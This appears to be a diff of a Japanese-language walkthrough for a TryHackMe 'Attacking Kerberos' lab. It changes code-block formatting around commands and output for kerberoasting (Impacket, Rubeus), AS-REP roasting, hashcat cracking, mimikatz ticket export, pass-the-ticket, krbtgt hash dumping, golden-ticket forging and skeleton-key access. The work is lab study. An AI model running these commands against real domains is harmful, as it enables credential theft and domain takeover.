@@ -33,14 +33,12 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+
 
 ### Not implemented (or log not saved)
 
-```
 
 ### 2. Local Shell
 
@@ -65,7 +63,7 @@ https://igorsec.blog/2023/12/15/tryhackme-attacking-kerberos/
 
 すべてのkerberoastableアカウントのKerberosハッシュをダンプしてくれる
 
-```
+```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[/usr/share/doc/python3-impacket/examples]
 └─$ sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.161.86 -request
 [sudo] password for n0z0:
@@ -79,13 +77,7 @@ CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                    
 [-] CCache file is not found. Skipping...
 $krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$7c221c1312a6acf62ff62153200a1f79$884f79695b62cec74d1965b07e4480b690b45ff06927f109529043189b184181f2a7701c75273e8a25e150a153b478e3dd2e09b33b77e8e6fa191f5245bcd16c877c192a209833e7a0a6f7bb885a62634bb00daeccc1498ff2c4d2732ca76a1660cb39dd6e6ea40837c91ffe2350d6fefa2dfeec2d696d04dfa84689d3480f8dfeb7a7ab8c3fa958a69143a4e43d2a038387f425df50baf710a94b4fcfd891d03a6dfc7bab6fd2f0271f3e3ec048369ab0b8ebe3e0f43782953657f0eb01e1a1edb77018c677c48bca937f9fae872986d4b019f735ecbe8eacac537886bff24a3bceba3cfdd566b7ad432405c115aab1381caa84791ade224c4ff4d5959823be5bb6cefab7bf1e89769fb48364d71ded91dfb9e827ee019ef919f55b1e2c5fda3f1633c06135bdbb1c093e3eec1b0971292e24e179f13c28f932ae57000b0dddaa312fc05b4ab3f9f38fa18217d74e996d898c90329c288ffc96dd8272d9b5058d23fdfa97321a555e2813406f40666c97ca98d93439e060544141ba196c96b630a236acb4e71e80889627d3e9dd53bfb3d539f77d703af016694281591d88559f268d100760ba4c1001cc50a937f079964597ea497e083c94c03b9ae8795d1458fd55004bba8bf06ec4b74b427ceebacf492e1409a06b6c0b0c09883f5a59e825d9bd6fe013dcd67f0ed59c5178575910d875edc6e5350beab29bff6fb61d337e1b3f247fdebdd3c5b64a22ed0376a02e3a9648653c4dbee9134e17c80fca71f82a2b2f27f8304a397aa8f58b2054f040729492c942694b5df7238afbe6fe237dc130784c17ea112421482bd0ecb2e455116cc1cfa21c530edce9d1384a0da3b74ef34b48dc89a388e1f22ffe1404078752ebec3ce65c85ffde233ecf675de021fbe0728feda468b9a1f85e2fd58612e55df1154bd6c8e81a9b645972f064015098f5fcb75700fb5a603464c8933539f0c87768f6ad843076a795634eb6841305c6893245dac186110b94556fadeccced46f44660f362356b0296c6820b4686015f56d655142bd829fd02c7a970de085bafdc31193da3d95181a5dd204254fac2664c6b0867e6d77260de31cf8662bd689d9641e3fc715bb50aa656c9fe7d1136ecda48ea311f86eaf74a75f9bed2d185a61983f9649f9dd72edde724baba5a683a37f479b1e59b429ff8827ea7da78c47ebcc9a0c695d08523181a9d6cc18516c946c21ae8479460a11ea42f199edecffab8b8ef66851b6d7c833fd42373473a683287527454d503d6f91c8b418d9f3c2bf44b689d088d975522e27b1fcd6e198a0731a64e19e04e968f85351fa4ef6f61bf6942cf8cfb095cc39240861c4f07b9548e26fe20c20b38818ca9a6214275
 $krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$2baa1fe93188e2d659ab5fc19217b5e2$3a24c67ae5c9bdd01afe937bf05d6553fd54e08b294d44aff1072341b44373d67d121d3d74aca9b5806699e9b6b76e8761d0330689dc62becdc8cb590e13f1b091e1fd8107512c2ea738615597d89616c6e697aa33a8c1e13a2873c299f8424338a7e2a52d5e15ad488a7f1cb7c5cfcd48273543f373939140de1b7d9929b6c709537d4ada530916ee8706ebe6eb9a2b46e275cef2b5b1b0404af9b01edf7e8c99aacd737c2d75c45b2695a98c5bdd3df4cf4519ff6c6973e7cd783f274f4a187d83142f2fa406fedd4a60519caf0de69a89380472e6156944b870c5d7a6205b7654846b930fd491de85fb47201f1263a4474c00e16b23561cb9c50e0443a9368933fea60498384c5ca95eb2112e266e546428ee1c564d135c93688536e5ebb6e8041a0ff66571dd1a88cc96a85f0f9147bccbf52e3e5073c99a135221b9d45ce318867391f8a9950560c54831d4952fddb9540e8d797d6a77a88824f92b9187bb8b9aebf9eb609e960de3ca29968a74fb1064aa814ca83fc7a90b9cd0de0cc06fa258ef5c46cac10a4025a7c9fb964af24ed06171adb3b142ec030f9bffd7238fc7876731ab92a92913c18178c4d5c93fbbb6303037d95aea025d146c2b0a1f731bac5aa0a5814e81b7ba37ba00db81390ce0a22ab55cb30e3f11da52e891a58b9d2530822b4d290c3e3d501b8d592edfbe27df1c79625aa37d5ba52dcab0f50f27826b567963eee9d7f9d658d75fe15dd405972d5b32dcc58cb21de4192a9e86aff2d3ded350abd010428982c6da248d93d4563d1e29ab9213479f54b8fb655690efa05bbffffefb79a7c464117e1a953426ffa63dfe5958396632ff8e5fd3ab94196b7af789b72b954dd98efd7a10656dcf2880a7a09831656050cdaaed67bdacc31bc7825cd5dd58d2cd8917a1c8d274a1ce602ec70d52cc87b315d7aec98c2f1825e47f85998ab14059af07a2cc57a504f9b4af319e26992b6843b89b56f9d02ae5bb01759e31a082f4969e0d5df34043372d38db14a3c9427ac392df02710e6085363925287dadd329851e4cf9985a6e168799dbba8bf1e54e5e700caff84c2d8e7ae0b90f998da982ba87e877c06b9c6a7b78adcfeaa8eac122347ce8bcfa6403010b375d6e83905bff134e2d659bc24cdaa4ea4719229a5e98292bdfd74182065f0526e765316035943833f7c338fd1837282300e66128957bd72cb1b8372b29c3cf562b536ee30f35987c8be533617b0df2afac3618c7380438cf8d89aaa26da2475fcf3784d624b50d166dc263f8d8299106217b3df54c07f4952cbc300876f56bc26e7fc61310092f4675cd487ab7061555d7839dd368a9ce15732422ccb7d8a04eabe6f536c0c8ddcc5a89
-```
-
-```
 Rubeus.exe asreproast
-```
-
-```
 C:\Users\Administrator\Downloads>Rubeus.exe asreproast
 
    ______        _
@@ -135,7 +127,7 @@ C:\Users\Administrator\Downloads>Rubeus.exe asreproast
 
 ハッシュをダンプするとパスワードが複合できる
 
-```
+```bash
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~/work/thm/Attacking_Kerberos]
 └─$ hashcat -m 18200 hash2.txt Pass.txt
 hashcat (v6.2.6) starting
@@ -273,7 +265,7 @@ Stopped: Thu Sep  5 01:41:15 2024
 
 この攻撃は事前認証がオフになっている場合に有効
 
-```
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -947,9 +939,6 @@ klist
 
 ```
 mimikatz # sekurlsa::tickets /export
-```
-
-```
 
 mimikatz # sekurlsa::tickets /export
 
@@ -996,9 +985,6 @@ SID               : S-1-5-18
 09/07/2024  02:38 AM             1,755 [0;a94f0]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
               18 File(s)      1,503,806 bytes
                2 Dir(s)  50,917,453,824 bytes free
-```
-
-```
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -1013,7 +999,7 @@ mimikatz # kerberos::ptt [0;44040]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.
 
 メモリに追加されたこと確認
 
-```
+```bash
 C:\Users\Administrator\Downloads>klist
 
 Current LogonId is 0:0x44040
@@ -1044,9 +1030,6 @@ privilege::debug
 
 ```
 lsadump::lsa /inject /name:krbtg
-```
-
-```
 mimikatz # lsadump::lsa /inject /name:krbtgt
 Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
 
@@ -1118,9 +1101,6 @@ id：500 DomainAdmin⇒512 5xx系が管理用アカウント
 
 ```
 Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:550
-```
-
-```
 mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
 User      : Administrator
 Domain    : controller.local (CONTROLLER)
@@ -1144,9 +1124,6 @@ mimikatz.で指定されたチケットで新しい昇格コマンドプロン�
 
 ```
 mimikatz # misc::cmd
-```
-
-```
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6360143B8
 ```
 
@@ -1154,9 +1131,6 @@ SQLサービスのハッシュを取得する
 
 ```
 lsadump::lsa /inject /name:SQLService
-```
-
-```
 Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
 
 RID  : 00000455 (1109)
@@ -1247,7 +1221,6 @@ net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 
 Desktop-1にアクセスできるユーザを知らなくても Desktop-1のデスクトップにアクセスできる
 
-```
 dir \\Desktop-1\c$ /user:Machine1 mimikatz
 
 💡 Why this works  
